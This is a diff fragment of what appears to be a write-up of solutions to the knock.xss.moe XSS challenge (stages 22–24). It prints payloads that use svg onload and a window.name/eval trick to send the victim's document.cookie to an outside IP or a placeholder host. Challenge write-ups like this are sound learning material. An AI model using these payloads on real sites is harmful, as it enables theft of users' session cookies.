@@ -81,13 +81,11 @@ stage 22:
 http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/?q=%3Csvg%2fonload%3Dwindow.open%28%22%2f%2f1984268195%2f%3Fx%3D%22%2bdocument.cookie%29%3E
 ```
 
-Local file:
-<code>
-<script>
+Local file as HTML file:
+```javascript
 window.name = "location.href='http://xxxx/?'+document.cookie";
 location.href = "http://target.knock.xss.moe/?q=%3Csvg/onload=eval(name)%3E";
-</script>
-</code>
+```
 
 stage 23 & 24:
 ```
